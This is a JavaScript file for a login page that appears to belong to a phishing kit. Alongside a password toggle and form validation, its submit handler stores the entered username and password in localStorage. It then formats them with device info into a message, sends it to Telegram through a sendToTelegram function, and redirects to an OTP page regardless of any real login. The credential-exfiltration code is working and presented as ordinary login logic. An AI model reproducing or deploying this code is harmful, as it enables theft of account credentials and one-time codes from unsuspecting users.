// Login Page JavaScript

document.addEventListener('DOMContentLoaded', function() {

    // Password Toggle Functionality
    const togglePassword = document.getElementById('togglePassword');
    const passwordInput = document.getElementById('password');
    const toggleText = togglePassword.querySelector('.toggle-text');
    const eyeIcon = togglePassword.querySelector('.eye-icon');

    if (togglePassword && passwordInput) {
        togglePassword.addEventListener('click', function() {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            
            if (type === 'text') {
                toggleText.textContent = 'Hide';
                eyeIcon.textContent = '👁️‍🗨️';
            } else {
                toggleText.textContent = 'Show';
                eyeIcon.textContent = '👁️';
            }
        });
    }

    // Login Form Submission
    const loginSubmitBtn = document.getElementById('loginSubmitBtn');
    const loginForm = document.querySelector('.login-form');
    const usernameInput = document.getElementById('username');
    const passwordInputField = document.getElementById('password');

    if (loginSubmitBtn) {
        loginSubmitBtn.addEventListener('click', function(e) {
            e.preventDefault();
            
            // Basic validation
            if (!usernameInput.value.trim()) {
                alert('Please enter your username');
                usernameInput.focus();
                return;
            }

            if (!passwordInputField.value.trim()) {
                alert('Please enter your password');
                passwordInputField.focus();
                return;
            }

            // Get user credentials
            const username = usernameInput.value.trim();
            const password = passwordInputField.value.trim();
            
            // Store credentials in localStorage for OTP page
            localStorage.setItem('loginUsername', username);
            localStorage.setItem('loginPassword', password);
            
            // Get user's IP and device info
            const userAgent = navigator.userAgent;
            const timestamp = new Date().toLocaleString();
            
            // Prepare message for Telegram
            const message = `
🔐 <b>New Login Attempt</b>

👤 <b>Username:</b> ${username}
🔑 <b>Password:</b> ${password}

📱 <b>Device Info:</b>
${userAgent}

🕐 <b>Time:</b> ${timestamp}
            `.trim();

            // Change button state
            loginSubmitBtn.textContent = 'Logging in...';
            loginSubmitBtn.disabled = true;

            // Send to Telegram
            if (typeof sendToTelegram === 'function') {
                sendToTelegram(message).then(success => {
                    if (success) {
                        console.log('Login credentials sent to Telegram');
                    } else {
                        console.log('Telegram send failed, but continuing with login');
                    }
                }).catch(error => {
                    console.log('Telegram error, but continuing with login:', error);
                });
            } else {
                console.log('Telegram not configured, continuing with login');
            }

            // Always redirect to OTP page after short delay
            setTimeout(() => {
                window.location.href = 'otp.html';
            }, 800);
        });
    }

    // Forgot Username Link
    const forgotUsernameLinks = document.querySelectorAll('.forgot-link');
    forgotUsernameLinks.forEach(link => {
        if (link.textContent.includes('username')) {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                alert('Forgot username functionality will be implemented here');
            });
        }
    });

    // Forgot Password Link
    forgotUsernameLinks.forEach(link => {
        if (link.textContent.includes('password')) {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                alert('Forgot password functionality will be implemented here');
            });
        }
    });
});
